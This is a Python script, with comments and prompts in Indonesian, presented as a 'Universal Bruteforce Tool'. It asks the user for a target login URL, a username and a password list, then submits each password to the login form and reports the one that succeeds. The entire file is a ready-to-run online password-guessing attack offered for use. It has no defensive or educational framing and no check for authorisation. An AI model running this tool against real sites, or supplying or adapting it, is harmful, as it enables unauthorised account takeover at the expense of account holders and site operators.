import requests
import os

# Warna terminal
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
RESET = "\033[0m"

# Banner
banner = f"""{GREEN}
██████╗ ██████╗ ██╗   ██╗████████╗███████╗██████╗ 
██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔══██╗
██████╔╝██████╔╝██║   ██║   ██║   █████╗  ██████╔╝
██╔═══╝ ██╔══██╗██║   ██║   ██║   ██╔══╝  ██╔══██╗
██║     ██║  ██║╚██████╔╝   ██║   ███████╗██║  ██║
╚═╝     ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝
{YELLOW}Universal Bruteforce Tool by Sibermuda{RESET}
"""

# Fungsi utama brute force
def bruteforce_login(login_url, username, password_file, user_field, pass_field, success_indicator):
    session = requests.Session()
    found = False

    try:
        with open(password_file, "r", encoding="utf-8") as file:
            passwords = file.readlines()

        for password in passwords:
            password = password.strip()
            data = {
                user_field: username,
                pass_field: password
            }

            print(f"{YELLOW}[~] Mencoba password: {password}{RESET}")
            response = session.post(login_url, data=data, allow_redirects=True)

            # Tampilkan info respons
            print(f"    Status: {response.status_code}, Redirect: {response.url}")

            # Deteksi keberhasilan login
            if success_indicator in response.text or success_indicator in response.url:
                print(f"\n{GREEN}[✔] Login BERHASIL! Username: {username} | Password: {password}{RESET}")
                found = True
                break
            else:
                print(f"{RED}[✘] Gagal: {password}{RESET}")
    except FileNotFoundError:
        print(f"{RED}[!] File password tidak ditemukan!{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error: {e}{RESET}")

    if not found:
        print(f"\n{RED}[!] Tidak ada password yang cocok.{RESET}")
    return

# Main program
if __name__ == "__main__":
    os.system("clear" if os.name == "posix" else "cls")
    print(banner)

    # Input dari user
    login_url = input(f"{YELLOW}Masukkan URL login target: {RESET}")
    username = input(f"{YELLOW}Masukkan username target: {RESET}")
    password_file = input(f"{YELLOW}Masukkan path file password list: {RESET}")
    user_field = input(f"{YELLOW}Nama field untuk username (cth: log / username / email): {RESET}")
    pass_field = input(f"{YELLOW}Nama field untuk password (cth: pwd / password): {RESET}")
    success_indicator = input(f"{YELLOW}Teks/URL yang menandakan login berhasil (cth: /dashboard, welcome): {RESET}")

    print(f"\n{BLUE}[!] Memulai brute force...{RESET}")
    bruteforce_login(login_url, username, password_file, user_field, pass_field, success_indicator)
